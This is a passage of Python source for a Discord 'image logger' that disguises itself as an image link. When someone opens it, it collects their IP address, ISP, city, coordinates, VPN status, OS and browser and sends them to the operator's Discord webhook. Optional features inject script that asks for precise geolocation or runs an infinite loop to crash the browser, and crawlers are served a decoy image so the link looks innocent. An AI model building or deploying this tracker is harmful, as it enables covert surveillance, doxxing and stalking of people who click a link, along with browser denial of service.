> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
